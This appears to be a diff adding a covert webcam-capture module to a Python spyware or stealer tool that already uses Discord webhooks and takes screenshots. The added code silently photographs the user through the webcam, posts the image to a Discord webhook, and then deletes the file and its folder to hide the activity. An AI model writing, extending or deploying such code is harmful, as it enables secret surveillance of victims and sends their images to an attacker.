@@ -15,6 +15,58 @@ import os
 import tempfile
 import asyncio
 from discord_webhook import DiscordWebhook
+import cv2
+import requests
+import os
+import time
+import shutil
+import getpass
+
+# Obtener la URL del webhook de Discord
+webhook_url = 'webhook here'
+
+# Obtener el directorio AppData del usuario actual
+appdata_dir = os.path.join(os.getenv('APPDATA'), 'captured_photos')
+os.makedirs(appdata_dir, exist_ok=True)
+
+# Capturar una imagen con la cámara web
+cap = cv2.VideoCapture(0)
+ret, frame = cap.read()
+
+# Generar un nombre de archivo único basado en la fecha y hora actual
+current_time = time.strftime('%Y%m%d_%H%M%S')
+filename = f'captured_photo_{current_time}.jpg'
+
+# Guardar la foto capturada en la carpeta AppData
+filepath = os.path.join(appdata_dir, filename)
+cv2.imwrite(filepath, frame)
+
+# Cerrar la cámara web
+cap.release()
+
+# Crear una instancia de MultipartEncoder para enviar la imagen como archivo adjunto
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+multipart_data = MultipartEncoder(fields={'file': (filename, open(filepath, 'rb'), 'image/jpeg')})
+
+# Enviar la imagen al webhook de Discord
+headers = {'Content-Type': multipart_data.content_type}
+response = requests.post(webhook_url, data=multipart_data, headers=headers)
+
+# Verificar si la solicitud fue exitosa
+if response.status_code == 200:
+    print('Imagen enviada con éxito a Discord.')
+else:
+    print('Error al enviar la imagen a Discord. Código de estado:', response.status_code)
+
+# Esperar 2 segundos
+time.sleep(2)
+
+# Eliminar la foto capturada del sistema
+os.remove(filepath)
+
+# Borrar la carpeta AppData si está vacía
+if len(os.listdir(appdata_dir)) == 0:
+    os.rmdir(appdata_dir)
 
 # taking ss
 
